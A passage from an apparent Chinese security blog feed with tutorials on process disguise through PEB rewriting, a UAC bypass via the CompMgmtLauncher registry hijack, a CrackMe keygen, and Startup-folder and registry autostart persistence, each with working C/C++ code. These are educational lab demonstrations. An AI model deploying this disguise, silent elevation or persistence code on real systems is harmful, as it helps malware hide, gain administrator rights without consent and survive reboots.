wcslen(lpwszCmd);<br><span class="hljs-comment">//写入命令行信息</span><br>WriteProcessMemory(hProcess, Param.CommandLine.Buffer, lpwszCmd, usCmdLen, <span class="hljs-literal">NULL</span>);<br>WriteProcessMemory(hProcess, &amp;Param.CommandLine.Length, &amp;usCmdLen, <span class="hljs-keyword">sizeof</span>(usCmdLen), <span class="hljs-literal">NULL</span>);<br>usPathLen = <span class="hljs-number">2</span> + <span class="hljs-number">2</span> * wcslen(lpwszPath);<br><span class="hljs-comment">//写入路径信息</span><br>WriteProcessMemory(hProcess, Param.ImagePathName.Buffer, lpwszPath, usPathLen, <span class="hljs-literal">NULL</span>);<br>WriteProcessMemory(hProcess, &amp;Param.ImagePathName.Length, &amp;usPathLen, <span class="hljs-keyword">sizeof</span>(usPathLen), <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//伪装自身获取自身PID，如果伪装其他程序可以通过窗口或者进程名方式获得PID </span><br><span class="hljs-keyword">if</span> (DisguiseProcess(_getpid(), <span class="hljs-string">L&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>, <span class="hljs-string">L&quot;C:\\Windows\\Syetem32\\notepad.exe&quot;</span>) == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;进程伪装失败\n&quot;</span>);<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;伪装成功\n&quot;</span>);<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行伪装程序，提示伪装成功</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/3.png"></p><p>然后使用Process Explorer查看伪装程序的相关信息。可以看到进程已经伪装成功，描述这里写着记事本，路径和命令行都是我们写入的伪装信息。</p><p><img src="/2021/07/21/%E9%9A%90%E8%97%8F%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E4%BC%AA%E8%A3%85/4.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>隐藏技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>提权技术-Bypass UAC</title>
    <link href="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/"/>
    <url>/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/</url>
    
    <content type="html"><![CDATA[<h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h4><p>UAC（UserAccount Control，用户账户控制）是微软在VISTA之后的版本中引入的一种安全机制，通过UAC，应用程序和任务可以始终在非管理员账户的安全上下文中运行，除非特别授予管理员级别的系统访问权限。UAC可以阻止未经授权的应用程序自动进行安装，并防止无意地更改系统设置。</p><p>正常UAC是有一个弹窗提示，而病毒木马为了隐藏自己，就需要不通知用户的情况下“偷偷“将自己提升为管理员权限。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/1.png"></p><p>在Windows中，一些高权限的程序在运行时，是不需要弹出UAC的。这些白名单程序，默认就是以管理员权限运行。可以通过DLL劫持、注入或者是修改注册表执行命令的方式启动目标程序，实现Bypass UAC提权操作。</p><p>下面拿白名单程序CompMgmtLauncher来进行一下分析。</p><h4 id="分析CompMgmtLauncher启动过程"><a href="#分析CompMgmtLauncher启动过程" class="headerlink" title="分析CompMgmtLauncher启动过程"></a>分析CompMgmtLauncher启动过程</h4><p>打开procmon工具来监控CompMgmtLauncher启动。可以看到，它会读取HKCU\Software\Classes\mscfile\shell\open\command中的值。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/2.png"></p><p>可以看一下，此路径中存在什么，可以看到其中没有值</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/3.png"></p><p>如果该路径没有值，然后就会查询HKCR\mscfile\shell\open\command，查看其中的值，存储这mmc.exe进程的路径信息。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/4.png"></p><p>现在可以知道，当它启动时，会先查看HKCU\Software\Classes\mscfile\shell\open\command，那么如果在这里添加路径信息，CompMgmtLauncher就会启动它。</p><p>现在就修改注册表信息，在HKCU\Software\Classes\mscfile\shell\open\command添加需要提权的程序路径，再运行CompMgmtLauncher就可以完成Bypass UAC提权。</p><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>    PVOID OldValue = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//关闭重定位</span><br>    <span class="hljs-built_in">Wow64DisableWow64FsRedirection</span>(&amp;OldValue);<br>    HKEY hKey = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">RegCreateKeyEx</span>(HKEY_CURRENT_USER, <span class="hljs-string">&quot;Software\\Classes\\mscfile\\Shell\\Open\\Command&quot;</span>,<br>        <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, KEY_WOW64_64KEY | KEY_ALL_ACCESS, <span class="hljs-literal">NULL</span>, &amp;hKey, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hKey == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;创建键值失败\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-built_in">RegSetValueEx</span>(hKey, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, REG_SZ, (BYTE*)<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>, (<span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>) + <span class="hljs-number">1</span>));<br>    <span class="hljs-built_in">RegCloseKey</span>(hKey);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;CompMgmtLauncher.exe&quot;</span>);<br>    <span class="hljs-built_in">Wow64RevertWow64FsRedirection</span>(OldValue);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这里需要提权的程序为桌面上的TestApc.exe，运行后查看效果。运行程序可以看到，testapc.exe直接运行。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/5.png"></p><p>使用procmon工具查看权限可以看到权限是高</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/6.png"></p><p>正常启动查看权限可以看到是中。</p><p><img src="/2021/07/20/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF-Bypass%20UAC/7.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>提权技术</tag>
      
      <tag>UAC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-002</title>
    <link href="/2021/07/20/160CrackMe-002/"/>
    <url>/2021/07/20/160CrackMe-002/</url>
    
    <content type="html"><![CDATA[<h4 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h4><p>打开程序，看到提示输入name和serial，输入后，提示错误。</p><p><img src="/2021/07/20/160CrackMe-002/1.png"></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>查壳，看到程序没有加壳，是用VB语言写的。</p><p><img src="/2021/07/20/160CrackMe-002/2.png"></p><p>使用OD进行分析，搜索错误提示的字符串，可以直接定位到关键的跳转</p><p><img src="/2021/07/20/160CrackMe-002/3.png"></p><p>开始分析生成serial的过程，首先是获取了name的长度然后将其乘以17CFB再加上name的第一个ASCII码，最后转为十进制字符串。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00402412 </span>  .  <span class="hljs-number">50</span>            push eax                                   ; /String = <span class="hljs-number">0000000</span>A ???<br><span class="hljs-symbol">00402413 </span>  .  <span class="hljs-number">8</span>B1A          mov ebx,dword ptr ds:[edx]                 ; |<br><span class="hljs-symbol">00402415 </span>  .  FF15 E4404000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaLenBstr&gt;; \__vbaLenBstr<br><span class="hljs-number">0040241</span>B   .  <span class="hljs-number">8</span>BF8          mov edi,eax                                ;  获取输入的<span class="hljs-keyword">name</span>长度传入edi以便运算<br><span class="hljs-number">0040241</span>D   .  <span class="hljs-number">8</span>B4D E8       mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x18]<br><span class="hljs-symbol">00402420 </span>  .  <span class="hljs-number">69</span>FF FB7C0100 imul edi,edi,<span class="hljs-number">0</span>x17CFB                       ;  长度乘<span class="hljs-number">0</span>x17CFB<br><span class="hljs-symbol">00402426 </span>  .  <span class="hljs-number">51</span>            push ecx                                   ; /String = <span class="hljs-number">80020004</span> ???<br><span class="hljs-symbol">00402427 </span>  .  <span class="hljs-number">0</span>F80 <span class="hljs-number">91020000</span> jo Afkayas_.<span class="hljs-number">004026</span>BE                       ; |<br><span class="hljs-number">0040242</span>D   .  FF15 F8404000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.#<span class="hljs-number">516</span>&gt;]       ; \rtcAnsiValueBstr<br><span class="hljs-symbol">00402433 </span>  .  <span class="hljs-number">0</span>FBFD0        movsx edx,ax                               ;  获取输入的第一个ascii传给edx<br><span class="hljs-symbol">00402436 </span>  .  <span class="hljs-number">03</span>FA          add edi,edx                                ;  乘法后的结果加上第一个ascii<br><span class="hljs-symbol">00402438 </span>  .  <span class="hljs-number">0</span>F80 <span class="hljs-number">80020000</span> jo Afkayas_.<span class="hljs-number">004026</span>BE<br><span class="hljs-number">0040243</span>E   .  <span class="hljs-number">57</span>            push edi                                   ;  MSVBVM50.__vbaStrCat<br><span class="hljs-number">0040243</span>F   .  FF15 E0404000 <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrI4&gt;] ;  计算结果转为字符串（十进制）<br><span class="hljs-symbol">00402445 </span>  .  <span class="hljs-number">8</span>BD0          mov edx,eax<br><span class="hljs-symbol">00402447 </span>  .  <span class="hljs-number">8D4</span>D E0       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x20]<br></code></pre></div></td></tr></table></figure><p>然后将计算出的结果与“AKA-”进行拼接，再获取serial进行比较。</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00402510 </span>  &gt; \<span class="hljs-number">8</span>B45 E8       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x18]            ;  输入的Serial<br><span class="hljs-symbol">00402513 </span>  .  <span class="hljs-number">8</span>B4D E4       mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x1C]            ;  计算后的结果<br><span class="hljs-symbol">00402516 </span>  .  <span class="hljs-number">8</span>B3D <span class="hljs-number">00414000</span> mov edi,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrC&gt;;  MSVBVM50.__vbaStrCat<br><span class="hljs-number">0040251</span>C   .  <span class="hljs-number">50</span>            push eax<br><span class="hljs-number">0040251</span>D   .  <span class="hljs-number">68</span> <span class="hljs-number">701</span>B4000   push Afkayas_.<span class="hljs-number">00401</span>B70                     ;  AKA-<br><span class="hljs-symbol">00402522 </span>  .  <span class="hljs-number">51</span>            push ecx                                   ; /String = <span class="hljs-number">80020004</span> ???<br><span class="hljs-symbol">00402523 </span>  .  FFD7          <span class="hljs-keyword">call</span> edi                                   ; \将AKA- 与计算后的数值拼接起来<br><span class="hljs-symbol">00402525 </span>  .  <span class="hljs-number">8</span>B1D <span class="hljs-number">70414000</span> mov ebx,dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrM&gt;;  MSVBVM50.__vbaStrMove<br><span class="hljs-number">0040252</span>B   .  <span class="hljs-number">8</span>BD0          mov edx,eax<br><span class="hljs-number">0040252</span>D   .  <span class="hljs-number">8D4</span>D E0       lea ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x20]<br><span class="hljs-symbol">00402530 </span>  .  FFD3          <span class="hljs-keyword">call</span> ebx                                   ;  MSVBVM50.__vbaStrMove; &lt;&amp;MSVBVM50.__vbaStrMove&gt;<br><span class="hljs-symbol">00402532 </span>  .  <span class="hljs-number">50</span>            push eax<br><span class="hljs-symbol">00402533 </span>  .  FF15 <span class="hljs-number">28414000</span> <span class="hljs-keyword">call</span> dword ptr ds:[&lt;&amp;MSVBVM50.__vbaStrCmp&gt;&gt;;  比较<br></code></pre></div></td></tr></table></figure><h4 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h4><p>根据分析的结果进行注册机编写</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;输入name\n&quot;</span>);<br><span class="hljs-keyword">char</span> name[<span class="hljs-number">20</span>];<br>gets_s(name, <span class="hljs-number">20</span>);<br><span class="hljs-keyword">int</span> length = <span class="hljs-built_in">strlen</span>(name);<br><span class="hljs-keyword">int</span> num = length * <span class="hljs-number">0x17CFB</span>;<br>num += name[<span class="hljs-number">0</span>];<br><span class="hljs-keyword">char</span>* s1 = <span class="hljs-string">&quot;AKA-&quot;</span>;<br><span class="hljs-keyword">char</span>* serial = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">100</span>);<br><span class="hljs-built_in">sprintf</span>(serial, <span class="hljs-string">&quot;%s%d&quot;</span>,s1,num);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;用户名是%s\n注册码是%s\n&quot;</span>,name, serial);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>运行输入name:b1ackie，输出serial:AKA-682815。</p><p><img src="/2021/07/20/160CrackMe-002/4.png"></p><p>输入正确的name和serial后，弹出正确提示</p><p><img src="/2021/07/20/160CrackMe-002/5.png"></p>]]></content>
    
    
    <categories>
      
      <category>CrackMe</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>CrackMe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自启动技术-快速启动目录</title>
    <link href="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/"/>
    <url>/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h4 id="快速启动目录"><a href="#快速启动目录" class="headerlink" title="快速启动目录"></a>快速启动目录</h4><p>Windows带有快速启动目录，将需要自启的程序放入其中，就可以实现开机自启。</p><h4 id="函数说明"><a href="#函数说明" class="headerlink" title="函数说明"></a>函数说明</h4><h5 id="SHGetSpecialFolderPath"><a href="#SHGetSpecialFolderPath" class="headerlink" title="SHGetSpecialFolderPath"></a>SHGetSpecialFolderPath</h5><p>获取指定的系统路径</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm"><span class="hljs-keyword">BOOL </span><span class="hljs-keyword">SHGetSpecialFolderPath(</span><br><span class="hljs-keyword"></span>  HWND  hwndOwner,<br>  LPSTR lpszPath,<br>  int   nFolder,<br>  <span class="hljs-keyword">BOOL </span> fCreate<br>);<br></code></pre></div></td></tr></table></figure><p>hwndOwner：窗口所有者句柄</p><p>lpszPath：返回路径的缓冲区，该缓冲区带下至少为MAX_PATH</p><p>nFolder：系统路径的CSIDL标识。</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>CSIDL_BITBUCKET</td><td>桌面\回收站</td></tr><tr><td>CSIDL_CONTROLS</td><td>我的电脑\控制面板</td></tr><tr><td>CSIDL_DESKTOP</td><td>桌面</td></tr><tr><td>CSIDL_DRIVES</td><td>我的电脑</td></tr><tr><td>CSIDL_STARTUP</td><td>开始菜单\程序\启动</td></tr><tr><td>CSIDL_SYSTEM</td><td>SYSTEM文件夹</td></tr><tr><td>CSIDL_WINDOWS</td><td>WINDOWS目录</td></tr></tbody></table><p>fCreate：指示文件夹不存在时是否要创建。为FALSE时则不创建，否则创建。</p><p>返回值：成功TRUE；失败FALSE。</p><h4 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4><p>获取系统的快速启动目录，然后将需要自启的程序放入快速启动目录中。</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;shlobj.h&gt;</span></span><br><span class="hljs-function">BOOL <span class="hljs-title">AutoRun</span><span class="hljs-params">(<span class="hljs-keyword">char</span>* lpszSrcFilePath, <span class="hljs-keyword">char</span>* lpszDestFileName)</span> </span>&#123;<br><span class="hljs-keyword">char</span> szStartUpPath[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-keyword">char</span> szDestFilePath[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-comment">//获取快速启动目录</span><br><span class="hljs-keyword">if</span> (SHGetSpecialFolderPathA(<span class="hljs-literal">NULL</span>, szStartUpPath, CSIDL_STARTUP, TRUE) == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取系统路径失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">//将数据写入指定的缓冲区</span><br>wsprintfA(szDestFilePath, <span class="hljs-string">&quot;%s\\%s&quot;</span>, szStartUpPath, lpszDestFileName);<br><span class="hljs-comment">//将文件内容拷贝到缓冲区</span><br><span class="hljs-keyword">if</span> (CopyFileA(lpszSrcFilePath, szDestFilePath, FALSE) == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;向快速启动目录写入失败\n&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">if</span> (AutoRun(<span class="hljs-string">&quot;C:\\Users\\b1ackie\\Desktop\\TestApc.exe&quot;</span>, <span class="hljs-string">&quot;TestApc.exe&quot;</span>) == FALSE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;失败\n&quot;</span>);<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;成功\n&quot;</span>);<br>system(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在物理机中运行一下此程序，火绒马上提醒</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/1.png"></p><p>在虚拟机中运行此程序，提示成功，然后到快速启动目录中查看，即可看到自启程序</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/2.png"></p><p>使用火绒剑进行查看，可以看到在windows的快速启动目录下，有TestApc.exe程序。</p><p><img src="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E5%BF%AB%E9%80%9F%E5%90%AF%E5%8A%A8%E7%9B%AE%E5%BD%95/3.png"></p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>参考《Windows黑客编程技术详解》一书</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>自启动技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>自启动技术-注册表</title>
    <link href="/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/"/>
    <url>/2021/07/19/%E8%87%AA%E5%90%AF%E5%8A%A8%E6%8A%80%E6%9C%AF-%E6%B3%A8%E5%86%8C%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h4 id="注册表方式实现自启动"><a href="#注册表方式实现自启动" class="headerlink" title="注册表方式实现自启动"></a>注册表方式实现自启动</h4><p>实现开机自启动的方式有很多，其中修改注册表的方式是最为广泛的。</p><h4 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h4><h5 id="RegOpenKeyEx"><a href="#RegOpenKeyEx" class="headerlink" title="RegOpenKeyEx"></a>RegOpenKeyEx</h5><p>打开一个指定的注册表键</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">LSTATUS <span class="hljs-title">RegOpenKeyExA</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HKEY   hKey,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR lpSubKey,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD  ulOptions,</span></span><br><span class="hljs-params"><span class="hljs-function">  REGSAM samDesired,</span></span><br><span class="hljs-params"><span class="hljs-function">  PHKEY  phkResult</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><p>hKey：打开注册表项的句柄。该句柄由RegCreateKeyEx或RegOpenKeyEx函数返回，或者它可以是以下预定义键之一：</p><ul><li>HKEY_CLASSES_ROOT</li><li>HKEY_CURRENT_CONFIG </li><li>HKEY_CURRENT_USER</li><li>HKEY_LOCAL_MACHINE</li><li>HKEY_USERS</li></ul><p>lpSubKey：将打开的注册表子项的名称</p><p>ulOptions：保留，必须设置为0</p><p>samDesired：对指定键希望得到的访问权限进行的访问标记。这个参数可以是下列值得组合</p><table><thead><tr><th>值</th><th>含义</th></tr></thead><tbody><tr><td>KEY_CREATE_LINK</td><td>准许生成符号键</td></tr><tr><td>KET_CREATE_SUB_KEY</td><td>准许生成子键</td></tr><tr><td>KEY_ENUMERATE_SUB_KEYS</td><td>准许生成枚举子键</td></tr><tr><td>KEY_EXECUTE</td><td>准许进行读操作</td></tr><tr><td>KEY_NOTIFY</td><td>准许更换通告</td></tr><tr><td>KEY_QUERY_VALUE</td><td>准许查询子键</td></tr><tr><td>KEY_ALL_ACESS</td><td>提供完全访问，它是上面数值的组合</td></tr><tr><td>KEY_READ</td><td>是KEY_QUERY_VALUE,KEY_ENUMERATE_SUB_KEYS,KEY_NOTIFY的组合</td></tr><tr><td>KEY_SET_VALUE</td><td>准许设置子键的数值</td></tr><tr><td>KEY_WRITE</td><td>是KEY_SET_VALUE、KET_CREATE_SUB_KEY的组合</td></tr><tr><td>KEY_WOW64_32KEY</td><td>表示64位系统中的应用程序应该在32位注册表试图上运行。32位系统会忽略该标志。</td></tr><tr><td>KEY_WOW64_64KEY</td><td>表示64位系统的应用程序应该在64位注册表试图上运行。32位系统上忽略该标志。</td></tr></tbody></table><p>phkResult：指向一个变量的指针，该变量保存打开注册表键的句柄。如果不再使用返回的句柄，则调用RegClose来关闭它。</p><p>返回值：如果成功，返回0；失败返回一个非零的错误代码。</p><h5 id="RegSetValueEx函数"><a href="#RegSetValueEx函数" class="headerlink" title="RegSetValueEx函数"></a>RegSetValueEx函数</h5><p>在注册表项下设置指定值得数据和类型</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span 